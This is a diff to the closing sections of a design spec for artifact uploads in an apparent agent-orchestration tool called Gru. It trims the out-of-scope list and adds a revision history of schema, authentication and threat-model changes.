 ## What's NOT in this spec
 
-- Push notifications when a new artifact is created (covered by the existing attention-queue / notification work).
-- Authoring tools for the minion to *generate* PDFs or HTML reports — minions already have shell access and can use `pandoc`, `weasyprint`, etc. Out of scope.
+- Push notifications when an artifact is created (handled by the existing attention-queue work).
+- Authoring tools for the minion to *generate* PDFs or HTML — minions already have `pandoc`, `weasyprint`, etc.
 - Cross-session artifact sharing or pinning at the project level.
-- Versioning or diffing of artifacts across uploads.
-- Per-operator visibility / ACLs on artifacts — Gru is single-operator today.
+- Versioning or supersedes-relationships between artifacts.
+- Per-operator visibility / ACLs on artifacts.
+
+---
+
+## Revision history
+
+- **2026-04-24** — Initial draft.
+- **2026-04-25** — Revised after design review. Split byte artifacts and external links into separate tables and RPCs (was one polymorphic `artifacts` table with conditional columns). Removed the `kind` enum entirely — server validates by MIME, UI renders by MIME, MVP allowlist is just `application/pdf`. Removed the `icon` field and the server-side Markdown rendering path (both speculation). Removed `project_id` from the artifacts schema (recoverable via `sessions.project_id`, unused). Replaced the bearer-token auth story for artifact GETs with a capability-URL token, since iframe `src` does not carry `Authorization`. Added explicit cross-origin / CSRF / cross-agent sections to the threat model. Added `count` + `bytes_used` to `ListArtifactsResponse` and the 409 response so agents can act on cap exceedance. Added a 410-on-terminal-session precondition to fix the upload-vs-kill race. Cut UI fluff (3-second tab pulse, empty-state details, the `replaces` future-extension hint).
